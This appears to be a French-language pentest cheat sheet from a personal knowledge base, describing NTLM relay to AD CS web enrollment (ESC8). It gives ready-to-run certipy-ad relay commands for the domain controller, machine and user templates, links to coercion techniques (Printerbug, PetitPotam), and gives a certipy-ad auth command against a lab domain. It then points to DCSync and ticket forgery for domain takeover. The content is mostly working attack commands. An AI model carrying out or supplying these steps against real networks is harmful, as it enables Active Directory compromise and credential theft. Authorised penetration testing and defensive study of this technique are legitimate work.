
> [!Tip]
> Vulnérable si enrôlement HTTP autorisé sans protection contre le relai NTLM



1. Mettre en place le relai pour un contrôleur de domaine / compte de machine / user

```sh
certipy-ad relay -target 'http://ip_du_CA' -template 'DomainController'
```
```sh
certipy-ad relay -target 'http://ip_du_CA' -template 'Machine'
```
```sh
certipy-ad relay -target 'http://ip_du_CA' -template 'User'
```

2. Coercition de la machine cible afin d'obtenir un certificat pour celle-ci.

[[Printerbug]]
[[OFFSEC/PENTEST/2. INFRA - INTERNE/6. POST EXPLOITATION/Attaques de Coercition/PetitPotam (MS-EFSRPC)|PetitPotam (MS-EFSRPC)]]




3. Pass The Cert + UnPAC The Hash

```sh
certipy-ad auth -pfx "file.pfx" -dc-ip '192.168.56.11' -username 'machine_account$' -domain 'north.sevenkingdoms.local'
```


Si le compte compromis est un DC -> [[1. DCSYNC]]
Si c'est un compte de machine classique -> [[3. Comptes de service - Comptes de machine#S4U2Self|S4U2SELF]] ou [[2. Ticket Forgery#Silver Ticket|Silver Ticket]].
Si c'est un compte utilisateur Admin du domain ->  [[1. DCSYNC]]
